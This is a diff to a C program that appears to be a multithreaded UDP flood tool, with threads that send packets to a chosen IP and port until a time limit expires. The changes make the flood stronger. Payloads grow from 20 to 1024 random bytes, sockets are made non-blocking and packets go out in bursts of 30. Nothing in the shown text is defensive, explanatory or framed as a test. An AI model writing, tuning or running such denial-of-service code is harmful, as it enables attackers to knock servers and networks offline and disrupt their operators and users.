@@ -11,9 +11,12 @@
     void usleep(int duration) { Sleep(duration / 1000); }
 #else
     #include <unistd.h>
+    #include <fcntl.h>
 #endif
 
-#define PAYLOAD_SIZE 20
+#define PAYLOAD_SIZE 1024
+#define BURST_PACKETS 30
+
 void *attack(void *arg);
 
 void handle_sigint(int sig) {
@@ -30,17 +33,14 @@ struct thread_data {
     char ip[16];
     int port;
     int time;
+    int thread_id;
+    int total_threads;
 };
 
 void generate_payload(char *buffer, size_t size) {
     for (size_t i = 0; i < size; i++) {
-  
-        buffer[i * 4] = '\\';
-        buffer[i * 4 + 1] = 'x';
-        buffer[i * 4 + 2] = "0123456789abcdef"[rand() % 16];
-        buffer[i * 4 + 3] = "0123456789abcdef"[rand() % 16];
+        buffer[i] = (char)(rand() % 256); // Random byte (0x00 to 0xFF)
     }
-    buffer[size * 4] = '\0';
 }
 
 void *attack(void *arg) {
@@ -49,7 +49,7 @@ void *attack(void *arg) {
     struct sockaddr_in server_addr;
     time_t endtime;
 
-    char payload[PAYLOAD_SIZE * 4 + 1];
+    char payload[PAYLOAD_SIZE];
     generate_payload(payload, PAYLOAD_SIZE);
 
     if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
@@ -62,14 +62,18 @@ void *attack(void *arg) {
     server_addr.sin_port = htons(data->port);
     server_addr.sin_addr.s_addr = inet_addr(data->ip);
 
+    int flags = fcntl(sock, F_GETFL, 0);
+    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+
     endtime = time(NULL) + data->time;
 
     while (time(NULL) <= endtime) {
-        ssize_t payload_size = strlen(payload);
-        if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-            perror("Send failed");
-            close(sock);
-            pthread_exit(NULL);
+        for (int i = 0; i < BURST_PACKETS; i++) {
+            if (sendto(sock, payload, PAYLOAD_SIZE, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+                perror("Send failed");
+                close(sock);
+                pthread_exit(NULL);
+            }
         }
     }
 
@@ -98,6 +102,8 @@ int main(int argc, char *argv[]) {
         strncpy(thread_data_array[i].ip, ip, 16);
         thread_data_array[i].port = port;
         thread_data_array[i].time = time;
+        thread_data_array[i].thread_id = i;
+        thread_data_array[i].total_threads = threads;
 
         if (pthread_create(&thread_ids[i], NULL, attack, (void *)&thread_data_array[i]) != 0) {
             perror("Thread creation failed");
@@ -105,7 +111,6 @@ int main(int argc, char *argv[]) {
             free(thread_data_array);
             exit(1);
         }
-        printf("Launched thread with ID: %lu\n", thread_ids[i]);
     }
 
     for (int i = 0; i < threads; i++) {
